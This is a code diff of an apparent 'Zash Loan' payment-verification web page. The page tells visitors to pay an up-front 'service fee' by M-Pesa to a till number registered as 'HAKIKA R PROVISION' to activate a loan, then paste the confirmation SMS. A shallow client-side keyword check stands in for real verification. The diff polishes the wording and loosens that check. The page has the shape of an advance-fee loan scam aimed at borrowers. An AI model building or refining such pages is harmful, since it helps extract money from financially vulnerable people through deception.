@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Zash Loan Payment Verification</title>
+  <title>Verify Payment | Zash Loan</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-gradient-to-br from-[#FF4E50] via-[#FF6A5C] to-[#FF7C65] min-h-screen text-[#b60000] flex items-center justify-center p-4">
@@ -11,8 +11,8 @@
   <div class="bg-white/90 backdrop-blur-md w-full max-w-md p-6 rounded-2xl shadow-2xl text-center">
     <img src="/mnt/data/e9c0da33-f4b7-46a9-b2bc-8ef8c4ec4d90.jpg" alt="Zash Logo" class="w-16 h-16 mx-auto mb-4 rounded-full shadow" />
 
-    <h1 class="text-xl font-bold text-[#FF4E50] mb-2">Loan Payment Verification</h1>
-    <p class="text-sm text-gray-700 mb-4">To activate your loan, please pay the service fee to the Till Number below.</p>
+    <h1 class="text-xl font-bold text-[#FF4E50] mb-2">Confirm Your Loan Payment</h1>
+    <p class="text-sm text-gray-700 mb-4">To proceed, pay the service fee via M-Pesa and paste the confirmation message below.</p>
 
     <!-- Loan Summary -->
     <div class="text-left bg-[#FFF5F5] p-4 rounded-xl border border-[#FFD4D4] text-sm space-y-2 mb-4">
@@ -24,26 +24,25 @@
         <span id="tillNumber" class="font-bold text-[#FF4E50]">9824375</span>
         <button onclick="copyTill()" class="text-xs bg-[#FF4E50] text-white px-2 py-1 rounded hover:bg-[#e93e3f]">Copy</button>
       </p>
-      <p class="text-xs text-gray-600">Use M-Pesa and ensure your confirmation message includes “<strong>HAKIKA R PROVISION</strong>”.</p>
     </div>
 
     <!-- Payment Instructions -->
     <div class="text-left bg-white border border-red-200 p-4 rounded-xl mb-6">
-      <h2 class="text-sm font-bold text-[#FF4E50] mb-2">💳 How to Pay via M-Pesa (Buy Goods & Services)</h2>
+      <h2 class="text-sm font-bold text-[#FF4E50] mb-2">💳 How to Pay via M-Pesa</h2>
       <ol class="text-sm list-decimal list-inside space-y-1 text-gray-700">
         <li>Go to M-Pesa menu</li>
         <li>Select <strong>Buy Goods and Services</strong></li>
         <li>Enter Till Number: <strong>9824375</strong></li>
         <li>Enter Amount: <strong><span id="guideFee">...</span></strong></li>
-        <li>Enter your M-Pesa PIN and press OK</li>
-        <li>Wait for SMS from Safaricom with confirmation</li>
+        <li>Enter your PIN and press OK</li>
+        <li>Wait for M-Pesa confirmation SMS</li>
       </ol>
     </div>
 
-    <!-- Mpesa Code Input -->
+    <!-- Mpesa Confirmation -->
     <div class="mb-4 text-left">
       <label for="mpesaText" class="block text-sm font-medium mb-1">Paste M-Pesa Confirmation Message</label>
-      <textarea id="mpesaText" rows="3" placeholder="e.g., QHG4RT8Y Confirmed. Ksh240 sent to HAKIKA R PROVISION Till 9824375..."
+      <textarea id="mpesaText" rows="3" placeholder="e.g., QHG4RT8Y Confirmed. Ksh240 sent to HAKIKA R PROVISION"
         class="w-full p-3 rounded-xl border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#FF4E50] text-sm"></textarea>
     </div>
 
@@ -74,12 +73,11 @@
 
     function submitMpesaMessage() {
       const message = document.getElementById("mpesaText").value.trim().toUpperCase();
-
       const hasKeyword = message.includes("HAKIKA R PROVISION");
-      const hasAmount = message.includes("KSH" + feeInt) || message.includes("KSH " + feeInt);
+      const hasFee = message.includes(feeInt.toString()) || message.includes("KSH" + feeInt) || message.includes("KSH " + feeInt);
 
-      if (message.length < 20 || !hasKeyword || !hasAmount || !hasTill) {
-        alert("❌ Your message must contain:\n- HAKIKA R PROVISION\n- Ksh " + feeInt ");
+      if (message.length < 10 || !hasKeyword || !hasFee) {
+        alert("❌ Invalid message. Please ensure it contains:\n- HAKIKA R PROVISION\n- Ksh " + feeInt);
         return;
       }
 
